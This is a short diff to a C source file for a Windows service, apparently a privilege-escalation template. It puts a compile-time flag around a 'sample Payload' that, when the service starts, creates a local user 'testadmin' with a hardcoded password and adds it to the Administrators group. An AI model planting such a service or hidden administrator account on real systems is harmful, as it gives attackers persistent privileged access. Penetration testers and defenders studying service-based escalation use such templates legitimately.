@@ -11,11 +11,15 @@
 #include <stdio.h>
 #include <lm.h>
 
+#ifndef SERVICE_NAME
 #define SERVICE_NAME "DummyService"
+#endif
 
+#ifdef INCLUDE_PAYLOAD
 #define USERNAME L"testadmin"
 #define PASSWORD L"myP@ssw0rd!"
 #define GROUP L"Administrators"
+#endif
 
 SERVICE_STATUS ServiceStatus; 
 SERVICE_STATUS_HANDLE hStatus; 
@@ -24,6 +28,7 @@ void ServiceMain(int argc, char** argv);
 void ControlHandler(DWORD request); 
 int InitService();
 
+#ifdef INCLUDE_PAYLOAD
 /* sample Payload: add local admin user using Windows API */
 void Payload(void)
 {
@@ -45,6 +50,7 @@ void Payload(void)
   mi.lgrmi3_domainandname = USERNAME;
   NetLocalGroupAddMembers(NULL, GROUP, dwLevel, (LPBYTE)&mi, dwEntries);
 }
+#endif
 
 void main() 
 {
@@ -96,7 +102,9 @@ void ServiceMain(int argc, char** argv)
   
 int InitService() 
 { 
+#ifdef INCLUDE_PAYLOAD
     Payload();
+#endif
     return 0;
 } 
  
